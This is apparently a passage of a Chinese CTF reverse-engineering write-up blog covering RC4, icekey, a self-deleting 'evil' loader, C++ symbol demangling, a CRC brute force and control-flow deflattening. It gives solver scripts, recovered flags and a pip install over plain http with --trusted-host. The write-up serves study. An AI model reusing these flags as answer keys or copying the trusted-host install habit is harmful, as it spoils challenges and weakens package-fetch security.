rc4_init(unsigned char*s, unsigned char*key, unsigned long Len)&#123;    int i = 0, j = 0;    char k[256] = &#123; 0 &#125;;    unsigned char tmp = 0;    for (i = 0; i&lt;256; i++)    &#123;        s[i] = i;//做一道re的题时这里就改为了，s[i]=256-i        k[i] = key[i%Len];    &#125;    for (i = 0; i&lt;256; i++)    &#123;        j = (j + s[i] + k[i]) % 256;        tmp = s[i];        s[i] = s[j];//交换s[i]和s[j]        s[j] = tmp;    &#125;&#125;/*加解密*/void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len)&#123;    int i = 0, j = 0, t = 0;    unsigned long k = 0;    unsigned char tmp;    for (k = 0; k&lt;Len; k++)    &#123;        i = (i + 1) % 256;        j = (j + s[i]) % 256;        tmp = s[i];        s[i] = s[j];//交换s[x]和s[y]        s[j] = tmp;        t = (s[i] + s[j]) % 256;        Data[k] = (Data[k]^s[t]);    &#125;&#125;int main()&#123;    unsigned char s[256] = &#123; 0 &#125;, s2[256] = &#123; 0 &#125;;//S-box    char key[256] =  &quot;qwertyuiop&quot; ;    char pData[512] = &#123;0x5b,0xd6,0xd0,0x26,0xc8,0xdd,0x19,0x7e,0x6e,0x3e,0xcb,0x16,0x91,0x7d,0xff,0xaf,0xdd,0x76,0x64,0xb0,0xf7,0xe5,0x89,0x57,0x82,0x9f,0xc,0x0,0x9e,0xd0,0x45,0xfa&#125;;    unsigned long len = 32;    int i;    printf(&quot;key=%s,length=%d\n\n&quot;, key, strlen(key));    rc4_init(s, (unsigned char*)key, strlen(key));//已经完成了初始化    for (i = 0; i&lt;256; i++)//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！    &#123;        s2[i] = s[i];    &#125;    //rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥    rc4_crypt(s2, (unsigned char*)pData, len);//解密    printf(&quot;flag&#123;&quot;);    for(i=31;i&gt;0;i--)    &#123;        printf(&quot;%c&quot;, pData[i]);    &#125;    printf(&quot;&#125;&quot;);    return 0;&#125;//flag&#123;973387a11fa3f724d74802857d3e052&#125;</code></pre><p>别人的python版本</p><pre><code>d = [0x5B, 0xD6, 0xD0, 0x26, 0xC8, 0xDD, 0x19, 126, 110, 62, -53, 22, -111, 125, -1, -81, -35, 118, 100, -80, -9, -27, -119, 87, -126, -97, 12, 0, -98, -48, 69, -6]import sys, os, hashlib, time, base64def rc4(plain, key):    box = list(range(256))    j = 0    for i in range(256):        j = (j + box[i] + ord(key[i % len(key)])) % 256        box[i], box[j] = box[j], box[i]    print(box)    # print(type(box)) #for_test    # return box    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr((s ^ k)&amp;0xff))    return resr = rc4(d, &quot;qwertyuiop&quot;)r = [(i) for i in r]print(&quot;&quot;.join(r[::-1]))</code></pre><h2 id="icekey"><a href="#icekey" class="headerlink" title="icekey"></a>icekey</h2><p>C#程序，用了一个ice算法，程序中自带加密解密，所以动调直接调用程序里面的解密函数解密密文就行了。</p><h2 id="evil"><a href="#evil" class="headerlink" title="evil"></a>evil</h2><p>这道题，大概看了下，做不了了，附件x.jpg都没给了，（后来在吾爱论坛找到了图片），但整个流程还是值得分析一波的。</p><p>脱壳就不说了，手动脱，esp定律。</p><p>然后就进入主函数分析。<br><img src="https://i.loli.net/2021/04/24/dRbZvrpEfuYceD6.png"><br>主要分析，那个sub_401370函数，这个函数就不应该执行。<br><img src="https://i.loli.net/2021/04/24/59dKJA4Mj6mVZWH.png"><br>后来再一分析，自毁进程的原因找到了，这也解释了为什么要复制自己到一个临时的文件目录。</p><p>这里我假设</p><pre><code>Buffer=C:\Users\Temp\a.exeFilename=D:\a.exeCommandLine=C:\Users\Temp\a.exe &quot;D:\a.exe&quot;</code></pre><p>然后根据<a href="https://www.cnblogs.com/weekbo/p/9054488.html">https://www.cnblogs.com/weekbo/p/9054488.html</a>，<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa</a>中讲述createprocess()api的第一个参数</p><p><img src="https://i.loli.net/2021/04/24/BdqC1IoM9LFOu3K.png"><br>所以说创建的进程实际上是我们复制的那个exe文件，也就是C:\Users\Temp\a.exe。</p><p>这就导致了我们会在新进程中的这个位置跳出来<br><img src="https://i.loli.net/2021/04/24/7ILbFTUr3CtBX9m.png"><br>接下来就进入了，sub_401620这个函数，进去看看。<br><img src="https://i.loli.net/2021/04/24/jJ2eRn6KsEpzMG5.png"><br>所以，原文件就被删除了。</p><p>然后要做这个题就要绕过前面的函数，直接跳到，从网站下载x.jpg和读取jpg的那个函数开始。</p><p>后头在吾爱破解论坛上找到了x.jpg，所以就可以做了，但是不知道为什么用动调来做，老是调到一个地方就调不走了。所以还是静态解吧。</p><p>解密函数</p><pre><code>#include&lt;stdio.h&gt;unsigned __int64 a=0x4A8754F5745174;unsigned char key[256]=&#123;&#125;;void getkey()&#123;    int i;    char v4[8]=&#123;0&#125;;    for(i=0;i&lt;8;i++)    &#123;        v4[i]=a;        a&gt;&gt;=8;    &#125;    for(i=0;i&lt;256;i++)    &#123;        key[i]=(i+v4[i%8])&amp;0xff;    &#125;&#125; decrypt(unsigned char v[])&#123;    int i,x=0,y=0;    unsigned int v4;    unsigned int v5;    for(i=0;i&lt;326;i++)    &#123;        x=(x+1)%256;        y=(key[x]+y)%256;        v4 = key[x];        v5 = key[y];        key[x] = v5;        key[y] = v4;        v[i]=(key[(v4+v5)%256]^v[i]^i)&amp;0xff;    &#125;&#125;int main(void)&#123;    FILE *fp;    unsigned char v[326]=&#123;0&#125;;    unsigned char flag[100]=&#123;0&#125;;    int i,j,k=0;    fp=fopen(&quot;x.jpg&quot;,&quot;rb&quot;);    fread(&amp;v, 1, 326, fp);    getkey();    decrypt(v);    for(i=0;i&lt;326;i++)    &#123;        if(v[i]==0x68)        &#123;            for(j=1;j&lt;5;j++)            &#123;                flag[k+j]=v[i+j];                printf(&quot;%c&quot;,flag[k+j]);                k+=4;            &#125;        &#125;    &#125;&#125;//嶯靗l A32.duserX   ratsCongcomXing.chuxuxhddidiade@d9e97173d4aed69bb1c4adacc49bTF-c DDCKey:</code></pre><p>解密得到的是shellcode，也就是机器码，我们提数据来得到flag</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(void)&#123;    char flag[]=&quot;com ing.chuxuxhddidiade@d9e97173d4aed69bb1c4adacc49bTF-c DDCKey:&quot;;    int i;    int len;    len=strlen(flag);//    printf(&quot;%d&quot;,len);    for(i=len-1;i&gt;0;i-=4)    &#123;        printf(&quot;%c%c%c%c&quot;,flag[i-3],flag[i-2],flag[i-1],flag[i]);    &#125;    &#125;//Key: DDCTF-cc49badacb1c4d69bd4ae7173d9e9ade@didiuxhdchuxing.com</code></pre><p>为了懒得提数据，我们也可以直接将解密数据放到xdbg的空白处，然后开头开始执行。</p><p><img src="https://i.loli.net/2021/04/24/kZpt3I2BVnwRlrm.png"></p><h2 id="childRE"><a href="#childRE" class="headerlink" title="childRE"></a>childRE</h2><p>考点是一个数据结构二叉树的变换顺序，没学数据结构，但是它的变换顺序是一定的，所以可以带值去找出变换顺序，然后就是UnDecorateSymbolName这个函数，函数反修饰指定已修饰的 C++ 符号名。</p><p>分析总流程<br><img src="https://i.loli.net/2021/04/26/RK2rpOxvG7t3HT6.png"></p><p>所以先求outputString。</p><p>脚本1</p><pre><code>//abcdefghijklmnopqrstuvwxyz12345#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include&lt;string.h&gt;int main(void)&#123;    char table[]=&quot;1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;&#39;ASDFGHJKL:\&quot;ZXCVBNM&lt;&gt;?zxcvbnm,./&quot;;    char table1[]=&quot;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&quot;;    char table2[]=&quot;55565653255552225565565555243466334653663544426565555525555222&quot;;    int v1[62],v2[62],code[62];    int i,j;//    int len=strlen(table);//    printf(&quot;%d&quot;,len);    for(i=0;i&lt;0x3E;i++)    &#123;        for(j=0;j&lt;=90;j++)        &#123;            if(table1[i]==table[j])            &#123;                v1[i]=j;                 break;            &#125;        &#125;    &#125;    for(i=0;i&lt;0x3E;i++)    &#123;        for(j=0;j&lt;=90;j++)        &#123;            if(table2[i]==table[j])            &#123;                v2[i]=j;                break;            &#125;        &#125;    &#125;    for(i=0;i&lt;62;i++)    &#123;        code[i]=v2[i]*23+v1[i];        printf(&quot;%c&quot;,code[i]);    &#125;&#125;//private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)</code></pre><p>手动还原回去，得到?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z。这个知识点《加密与解密》第4章讲了一小部分，然后这个师傅写的比较详细<a href="https://www.freesion.com/article/6515734088/">https://www.freesion.com/article/6515734088/</a>，然后进行位置变换。<br>脚本2，a数组是我自己试的数据，b数组是动调得到的数据。</p><pre><code>#include&lt;stdio.h&gt;int main()&#123;    int a[31]=&#123;  0x70, 0x71, 0x68, 0x72, 0x73, 0x69, 0x64, 0x74, 0x75, 0x6A,             0x76, 0x77, 0x6B, 0x65, 0x62, 0x78, 0x79, 0x6C, 0x7A, 0x31,             0x6D, 0x66, 0x32, 0x33, 0x6E, 0x34, 0x35, 0x6F, 0x67, 0x63,             0x61&#125;;      int b[31]=&#123;0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A,             0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74,             0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x31, 0x32, 0x33, 0x34,             0x35&#125;;    int c[31];    char str[]=&quot;?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z&quot;;    int i,j;    for(i=0;i&lt;31;i++)    &#123;        for(j=0;j&lt;31;j++)        &#123;              if(b[i]==a[j])              &#123;                  c[i]=j;              //    printf(&quot;%d &quot;,c[i]);            &#125;        &#125;        &#125;    for(i=0;i&lt;31;i++)    &#123;        printf(&quot;%c&quot;,str[c[i]]);    &#125;&#125;//Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP</code></pre><p>脚本3，md5加密</p><pre><code>import hashlibstr=&#39;Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP&#39;flag = hashlib.md5(str.encode(&#39;utf-8&#39;)).hexdigest()print(&#39;flag&#123;&#39;+flag+&#39;&#125;&#39;)//flag&#123;63b148e750fed3a33419168ac58083f5&#125;</code></pre><h2 id="RE-Crc-300"><a href="#RE-Crc-300" class="headerlink" title="RE-Crc-300"></a>RE-Crc-300</h2><p>一个窗口类的程序，正好大致看了看crc，嘻嘻。</p><p>进入到DialogFunc函数，可以看到很清晰的结构。<br><img src="https://i.loli.net/2021/04/26/J8hRMLTxGI9uPBi.png"><br>进入CRC检验函数，查看逻辑<br><img src="https://i.loli.net/2021/04/26/UWDKQ4d38JThMi6.png"><br>所以分奇，偶爆破就行。</p><p>exp，本来想写个python的，但爆不出来，还是用c吧</p><pre><code>#include&lt;stdio.h&gt;int dword_AAFD60[]=&#123;0x00000000,0x00000000,0x77073096,0xF26B8303,0xEE0E612C,0xE13B70F7,0x990951BA,0x1350F3F4,0x076DC419,0xC79A971F,0x706AF48F,0x35F1141C,0xE963A535,0x26A1E7E8,0x9E6495A3,0xD4CA64EB,0x0EDB8832,0x8AD958CF,0x79DCB8A4,0x78B2DBCC,0xE0D5E91E,0x6BE22838,0x97D2D988,0x9989AB3B,0x09B64C2B,0x4D43CFD0,0x7EB17CBD,0xBF284CD3,0xE7B82D07,0xAC78BF27,0x90BF1D91,0x5E133C24,0x1DB71064,0x105EC76F,0x6AB020F2,0xE235446C,0xF3B97148,0xF165B798,0x84BE41DE,0x030E349B,0x1ADAD47D,0xD7C45070,0x6DDDE4EB,0x25AFD373,0xF4D4B551,0x36FF2087,0x83D385C7,0xC494A384,0x136C9856,0x9A879FA0,0x646BA8C0,0x68EC1CA3,0xFD62F97A,0x7BBCEF57,0x8A65C9EC,0x89D76C54,0x14015C4F,0x5D1D08BF,0x63066CD9,0xAF768BBC,0xFA0F3D63,0xBC267848,0x8D080DF5,0x4E4DFB4B,0x3B6E20C8,0x20BD8EDE,0x4C69105E,0xD2D60DDD,0xD56041E4,0xC186FE29,0xA2677172,0x33ED7D2A,0x3C03E4D1,0xE72719C1,0x4B04D447,0x154C9AC2,0xD20D85FD,0x061C6936,0xA50AB56B,0xF477EA35,0x35B5A8FA,0xAA64D611,0x42B2986C,0x580F5512,0xDBBBC9D6,0x4B5FA6E6,0xACBCF940,0xB93425E5,0x32D86CE3,0x6DFE410E,0x45DF5C75,0x9F95C20D,0xDCD60DCF,0x8CC531F9,0xABD13D59,0x7EAEB2FA,0x26D930AC,0x30E349B1,0x51DE003A,0xC288CAB2,0xC8D75180,0xD1D83946,0xBFD06116,0x23B3BA45,0x21B4F4B5,0xF779DEAE,0x56B3C423,0x05125DAD,0xCFBA9599,0x1642AE59,0xB8BDA50F,0xE4292D5A,0x2802B89E,0xBA3A117E,0x5F058808,0x4851927D,0xC60CD9B2,0x5B016189,0xB10BE924,0xA96AE28A,0x2F6F7C87,0x7DA08661,0x58684C11,0x8FCB0562,0xC1611DAB,0x9C9BF696,0xB6662D3D,0x6EF07595,0x76DC4190,0x417B1DBC,0x01DB7106,0xB3109EBF,0x98D220BC,0xA0406D4B,0xEFD5102A,0x522BEE48,0x71B18589,0x86E18AA3,0x06B6B51F,0x748A09A0,0x9FBFE4A5,0x67DAFA54,0xE8B8D433,0x95B17957,0x7807C9A2,0xCBA24573,0x0F00F934,0x39C9C670,0x9609A88E,0x2A993584,0xE10E9818,0xD8F2B687,0x7F6A0DBB,0x0C38D26C,0x086D3D2D,0xFE53516F,0x91646C97,0xED03A29B,0xE6635C01,0x1F682198,0x6B6B51F4,0x5125DAD3,0x1C6C6162,0xA34E59D0,0x856530D8,0xB01EAA24,0xF262004E,0x42752927,0x6C0695ED,0x96BF4DCC,0x1B01A57B,0x64D4CECF,0x8208F4C1,0x77843D3B,0xF50FC457,0x85EFBE38,0x65B0D9C6,0xDBFC821C,0x12B7E950,0x2997011F,0x8BBEB8EA,0x3AC7F2EB,0xFCB9887C,0xC8AC71E8,0x62DD1DDF,0x1C661503,0x15DA2D49,0xEE0D9600,0x8CD37CF3,0xFD5D65F4,0xFBD44C65,0x0F36E6F7,0x4DB26158,0x61C69362,0x3AB551CE,0x93AD1061,0xA3BC0074,0x80FDE395,0xD4BB30E2,0x72966096,0x4ADFA541,0xA65C047D,0x3DD895D7,0x5437877E,0xA4D1C46D,0x4767748A,0xD3D6F4FB,0xB50CF789,0x4369E96A,0xEB1FCBAD,0x346ED9FC,0x197448AE,0xAD678846,0x0A24BB5A,0xDA60B8D0,0xF84F3859,0x44042D73,0x2C855CB2,0x33031DE5,0xDEEEDFB1,0xAA0A4C5F,0xCDBE2C45,0xDD0D7CC9,0x3FD5AF46,0x5005713C,0x7198540D,0x270241AA,0x83F3D70E,0xBE0B1010,0x90A324FA,0xC90C2086,0x62C8A7F9,0x5768B525,0xB602C312,0x206F85B3,0x44694011,0xB966D409,0x5739B3E5,0xCE61E49F,0xA55230E6,0x5EDEF90E,0xFB410CC2,0x29D9C998,0x092A8FC1,0xB0D09822,0x1A7A7C35,0xC7D7A8B4,0xE811FF36,0x59B33D17,0x3CDB9BDD,0x2EB40D81,0xCEB018DE,0xB7BD5C3B,0xDDE0EB2A,0xC0BA6CAD,0x2F8B6829,0xEDB88320,0x82F63B78,0x9ABFB3B6,0x709DB87B,0x03B6E20C,0x63CD4B8F,0x74B1D29A,0x91A6C88C,0xEAD54739,0x456CAC67,0x9DD277AF,0xB7072F64,0x04DB2615,0xA457DC90,0x73DC1683,0x563C5F93,0xE3630B12,0x082F63B7,0x94643B84,0xFA44E0B4,0x0D6D6A3E,0xE9141340,0x7A6A5AA8,0x1B7F9043,0xE40ECF0B,0xCFB5F4A8,0x9309FF9D,0x3DDE77AB,0x0A00AE27,0x2E8E845F,0x7D079EB1,0xDCE5075C,0xF00F9344,0x92A8FC17,0x8708A3D2,0x60C37F14,0x1E01F268,0x73938CE0,0x6906C2FE,0x81F80FE3,0xF762575D,0x55326B08,0x806567CB,0xA759E80B,0x196C3671,0xB4091BFF,0x6E6B06E7,0x466298FC,0xFED41B76,0x1871A4D8,0x89D32BE0,0xEA1A27DB,0x10DA7A5A,0xF94AD42F,0x67DD4ACC,0x0B21572C,0xF9B9DF6F,0xDFEB33C7,0x8EBEEFF9,0x2D80B0C4,0x17B7BE43,0x3ED04330,0x60B08ED5,0xCCBBC033,0xD6D6A3E8,0xA24BB5A6,0xA1D1937E,0x502036A5,0x38D8C2C4,0x4370C551,0x4FDFF252,0xB11B4652,0xD1BB67F1,0x65D122B9,0xA6BC5767,0x97BAA1BA,0x3FB506DD,0x84EA524E,0x48B2364B,0x7681D14D,0xD80D2BDA,0x2892ED69,0xAF0A1B4C,0xDAF96E6A,0x36034AF6,0xC9A99D9E,0x41047A60,0x3BC21E9D,0xDF60EFC3,0xEF087A76,0xA867DF55,0x1D63F975,0x316E8EEF,0x0E330A81,0x4669BE79,0xFC588982,0xCB61B38C,0xB21572C9,0xBC66831A,0x407EF1CA,0x256FD2A0,0x532E023E,0x5268E236,0xA145813D,0xCC0C7795,0x758FE5D6,0xBB0B4703,0x87E466D5,0x220216B9,0x94B49521,0x5505262F,0x66DF1622,0xC5BA3BBE,0x38CC2A06,0xB2BD0B28,0xCAA7A905,0x2BB45A92,0xD9F75AF1,0x5CB36A04,0x2B9CD9F2,0xC2D7FFA7,0xFF56BD19,0xB5D0CF31,0x0D3D3E1A,0x2CD99E8B,0x1E6DCDEE,0x5BDEAE1D,0xEC064EED,0x9B64C2B0,0xC38D26C4,0xEC63F226,0x31E6A5C7,0x756AA39C,0x22B65633,0x026D930A,0xD0DDD530,0x9C0906A9,0x0417B1DB,0xEB0E363F,0xF67C32D8,0x72076785,0xE52CC12C,0x05005713,0x1747422F,0x95BF4A82,0x49547E0B,0xE2B87A14,0xBB3FFD08,0x7BB12BAE,0xA86F0EFC,0x0CB61B38,0x5A048DFF,0x92D28E9B,0x8ECEE914,0xE5D5BE0D,0x7CA56A17,0x7CDCEFB7,0x6FF599E3,0x0BDBDF21,0x9D9E1AE0,0x86D3D2D4,0xD3D3E1AB,0xF1D4E242,0x21B862A8,0x68DDB3F8,0x32E8915C,0x1FDA836E,0xC083125F,0x81BE16CD,0x144976B4,0xF6B9265B,0xE622F5B7,0x6FB077E1,0xF5720643,0x18B74777,0x07198540,0x88085AE6,0x590AB964,0xFF0F6A70,0xAB613A67,0x66063BCA,0xB831C993,0x11010B5C,0x4A5A4A90,0x8F659EFF,0x9E902E7B,0xF862AE69,0x6CFBAD78,0x616BFFD3,0x7FAB5E8C,0x166CCF45,0x8DC0DD8F,0xA00AE278,0xE330A81A,0xD70DD2EE,0x115B2B19,0x4E048354,0x020BD8ED,0x3903B3C2,0xF0605BEE,0xA7672661,0x24AA3F05,0xD06016F7,0xD6C1BC06,0x4969474D,0xC5914FF2,0x3E6E77DB,0x37FACCF1,0xAED16A4A,0x69E9F0D5,0xD9D65ADC,0x9B8273D6,0x40DF0B66,0x88D28022,0x37D83BF0,0x7AB90321,0xA9BCAE53,0xAE7367CA,0xDEBB9EC5,0x5C18E4C9,0x47B2CF7F,0x4F48173D,0x30B5FFE9,0xBD23943E,0xBDBDF21C,0xF36E6F75,0xCABAC28A,0x0105EC76,0x53B39330,0x12551F82,0x24B4A3A6,0xE03E9C81,0xBAD03605,0x34F4F86A,0xCDD70693,0xC69F7B69,0x54DE5729,0xD5CF889D,0x23D967BF,0x27A40B9E,0xB3667A2E,0x79B737BA,0xC4614AB8,0x8BDCB4B9,0x5D681B02,0x988C474D,0x2A6F2B94,0x6AE7C44E,0xB40BBE37,0xBE2DA0A5,0xC30C8EA1,0x4C4623A6,0x5A05DF1B,0x5F16D052,0x2D02EF8D,0xAD7D5351&#125;;void check1(int a,int b,int c,int d,int e)&#123;    unsigned int v6=-1;    int i;    char table[]=&#123;0x53, 0x6F, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73,  0x20, 0x61, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x64, 0x69, 0x66,  0x66, 0x63, 0x75, 0x6C, 0x74, 0x20, 0x70, 0x72, 0x6F, 0x62,  0x6C, 0x65, 0x6D, 0x20, 0x69, 0x66, 0x20, 0x79, 0x6F, 0x75,  0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x61, 0x20, 0x76, 0x65,  0x72, 0x79, 0x20, 0x67, 0x6F, 0x6F, 0x64, 0x20, 0x63, 0x6F,  0x6D, 0x70, 0x75, 0x74, 0x65, 0x2E, 0x42, 0x75, 0x74, 0x20,  0x69, 0x66, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x64, 0x6F, 0x20,  0x6E, 0x6F, 0x74, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x61,  0x20, 0x67, 0x6F, 0x6F, 0x64, 0x20, 0x63, 0x6F, 0x6D, 0x70,  0x75, 0x74, 0x65, 0x72, 0x2E, 0x49, 0x74, 0x20, 0x73, 0x65,  0x65, 0x6D, 0x73, 0x20, 0x74, 0x68, 0x61, 0x74, 0x20, 0x54,  0x68, 0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x62, 0x6C, 0x65,  0x6D, 0x20, 0x77, 0x69, 0x6C, 0x6C, 0x20, 0x74, 0x61, 0x6B,  0x65, 0x20, 0x61, 0x20, 0x6C, 0x6F, 0x74, 0x20, 0x6F, 0x66,  0x20, 0x74, 0x69, 0x6D, 0x65, 0x2E, 0x42, 0x75, 0x74, 0x20,  0x6E, 0x6F, 0x74, 0x20, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x20,  0x69, 0x73, 0x20, 0x69, 0x6D, 0x70, 0x6F, 0x73, 0x73, 0x69,  0x62, 0x6C, 0x65, 0x2E, 0x53, 0x6F, 0x20, 0x6A, 0x75, 0x73,  0x74, 0x20, 0x74, 0x72, 0x79, 0x20, 0x69, 0x74, 0x21, 0x21,  0x53, 0x6F, 0x6D, 0x65, 0x20, 0x74, 0x69, 0x6D, 0x65, 0x73,  0x2C, 0x54, 0x68, 0x65, 0x20, 0x74, 0x68, 0x69, 0x6E, 0x67,  0x20, 0x77, 0x65, 0x20, 0x73, 0x65, 0x65, 0x6D, 0x20, 0x69,  0x73, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x72, 0x65, 0x61, 0x6C,  0x6C, 0x20, 0x5B, 0x5D, 0x5B, 0x5D, 0x28, 0x29, 0x28, 0x29,  0x3C, 0x3E, 0x3C, 0x3E, 0x2E, 0x2E, 0x00&#125;;    table[0x00]=a;    table[0x22]=b;    table[0x44]=c;    table[0x66]=d;    table[0x88]=e;    for(i=0;i&lt;256;i+=2)    &#123;        v6 = dword_AAFD60[2 * (unsigned __int8)(v6 ^ table[i])] ^ (v6 &gt;&gt; 8);    &#125;    if(~v6==0xBA56C4F9)    &#123;        printf(&quot;%c%c%c%c%c &quot;,a,b,c,d,e);    &#125;&#125;void check2(int a,int b,int c,int d,int e)&#123;    unsigned int v4=-1;    int i;    char table[]=&#123;0x53, 0x6F, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73,  0x20, 0x61, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x64, 0x69, 0x66,  0x66, 0x63, 0x75, 0x6C, 0x74, 0x20, 0x70, 0x72, 0x6F, 0x62,  0x6C, 0x65, 0x6D, 0x20, 0x69, 0x66, 0x20, 0x79, 0x6F, 0x75,  0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x61, 0x20, 0x76, 0x65,  0x72, 0x79, 0x20, 0x67, 0x6F, 0x6F, 0x64, 0x20, 0x63, 0x6F,  0x6D, 0x70, 0x75, 0x74, 0x65, 0x2E, 0x42, 0x75, 0x74, 0x20,  0x69, 0x66, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x64, 0x6F, 0x20,  0x6E, 0x6F, 0x74, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x61,  0x20, 0x67, 0x6F, 0x6F, 0x64, 0x20, 0x63, 0x6F, 0x6D, 0x70,  0x75, 0x74, 0x65, 0x72, 0x2E, 0x49, 0x74, 0x20, 0x73, 0x65,  0x65, 0x6D, 0x73, 0x20, 0x74, 0x68, 0x61, 0x74, 0x20, 0x54,  0x68, 0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x62, 0x6C, 0x65,  0x6D, 0x20, 0x77, 0x69, 0x6C, 0x6C, 0x20, 0x74, 0x61, 0x6B,  0x65, 0x20, 0x61, 0x20, 0x6C, 0x6F, 0x74, 0x20, 0x6F, 0x66,  0x20, 0x74, 0x69, 0x6D, 0x65, 0x2E, 0x42, 0x75, 0x74, 0x20,  0x6E, 0x6F, 0x74, 0x20, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x20,  0x69, 0x73, 0x20, 0x69, 0x6D, 0x70, 0x6F, 0x73, 0x73, 0x69,  0x62, 0x6C, 0x65, 0x2E, 0x53, 0x6F, 0x20, 0x6A, 0x75, 0x73,  0x74, 0x20, 0x74, 0x72, 0x79, 0x20, 0x69, 0x74, 0x21, 0x21,  0x53, 0x6F, 0x6D, 0x65, 0x20, 0x74, 0x69, 0x6D, 0x65, 0x73,  0x2C, 0x54, 0x68, 0x65, 0x20, 0x74, 0x68, 0x69, 0x6E, 0x67,  0x20, 0x77, 0x65, 0x20, 0x73, 0x65, 0x65, 0x6D, 0x20, 0x69,  0x73, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x72, 0x65, 0x61, 0x6C,  0x6C, 0x20, 0x5B, 0x5D, 0x5B, 0x5D, 0x28, 0x29, 0x28, 0x29,  0x3C, 0x3E, 0x3C, 0x3E, 0x2E, 0x2E, 0x00&#125;;    table[0x11]=a;    table[0x33]=b;    table[0x55]=c;    table[0x77]=d;    table[0x99]=e;    for(i=0;i&lt;256;i+=2)    &#123;        v4 = dword_AAFD60[2 * (unsigned __int8)(v4 ^ table[i+1]) +1] ^ (v4 &gt;&gt; 8);    &#125;    if(~v4==0xE89BA203)    &#123;        printf(&quot;%c%c%c%c%c &quot;,a,b,c,d,e);    &#125;&#125;int main()&#123;    int a,b,c,d,e;    for(a=30;a&lt;=128;a++)    &#123;        for(b=30;b&lt;128;b++)        &#123;            for(c=30;c&lt;128;c++)            &#123;                for(d=30;d&lt;128;d++)                &#123;                    for(e=30;e&lt;128;e++)                    &#123;                        check1(a,b,c,d,e);                        check2(a,b,c,d,e);                    &#125;                    &#125;             &#125;         &#125;    &#125;&#125; //I sac//ti  r</code></pre><p>爆破时间比较久。爆出来，我发现多解还挺多，哈哈哈<br><img src="https://i.loli.net/2021/04/27/4VtHKqGjpRr6ul3.png"></p><p>将正确的拼接一下得到hctf{It is a crc program!}</p><h2 id="polyre"><a href="#polyre" class="headerlink" title="polyre"></a>polyre</h2><p>ida打开，可以看到用了控制流平坦化。<br><img src="https://i.loli.net/2021/04/28/5SlpRoOLeHKCu3s.png"><br>看了wp，说要用脚本处理一下，<a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a>下载deflat.py处理，这里使用这个脚本还是花费了一些时间来配环境，网上也没有具体教程，这里就说详细点。</p><p>首先安装angr，<a href="https://blog.csdn.net/weixin_45055269/article/details/105176185">https://blog.csdn.net/weixin_45055269/article/details/105176185</a>，注意升级pip。</p><pre><code>pip3 install virtualenv//安装virtualenvmkdir angrcd angrsource venv/bin/activate//进入对应的环境pip3 install -i http://pypi.douban.com/simple --trusted-host pypi.douban.com angr//安装angrdeactive//退出当前venv环境</code></pre><p>每次使用的时候要先进入这个环境(source venv/bin/activate)。我们创建这个angr文件夹里面，就有一个python3.8的环境，里面已经有了angr，但是要用deflat.py这个脚本还少了am_graph.py，找了许久，结果就在GitHub那个项目里面，放到python3.8的site-packages。</p><p>然后就可以用了，嘻嘻，这个python3是angr中的python3.8。<br><img src="https://i.loli.net/2021/04/28/iYn5LMzWAaOcJdK.png"><br>完成后，就会生成一个polyre_recovered文件，再次用ida打开就会看到代码好看多了。</p><p>这里正式来分析逻辑，其中的while()都不用管，用来干扰分析的，真正处理部分如下。<br><img src="https://i.loli.net/2021/04/28/JryegD3oKzn2xHO.png"><br>我用c写的类似过程。</p><pre><code>#include&lt;stdio.h&gt;int main()&#123;    int i;    for(i=0;i&lt;6;i++)    &#123;        for(j=0;j&lt;64;j++)        &#123;            if(flag[i]&gt;=0)            &#123;                flag[i]=flag[i]&lt;&lt;1;            &#125;            else            &#123;                flag[i]=flag[i]&lt;&lt;1;                flag[i]=flag[i]^0xB0004B7679FA26B3;            &#125;                    &#125;     &#125; &#125;</code></pre><p>比较部分<br><img src="https://i.loli.net/2021/04/28/O7kCeTWrBylw13q.png"><br>然后要解的话有两个思路，一个用z3，z3yyds</p><pre><code>from z3 import *code=[0x0BC8FF26D43536296,0x520100780530EE16,0x4DC0B5EA935F08EC,0x342B90AFD853F450,      0x8B250EBCAA2C3681,0x55759F81A2C68AE4]s = Solver()flag = [BitVec(&#39;flag[%d]&#39; % i, 64) for i in range(6)]for i in range(6):  for j in range(64):    flag[i]=If(flag[i]&gt;=0,flag[i]*2,(flag[i]*2)^0xB0004B7679FA26B3)//z3特有的If  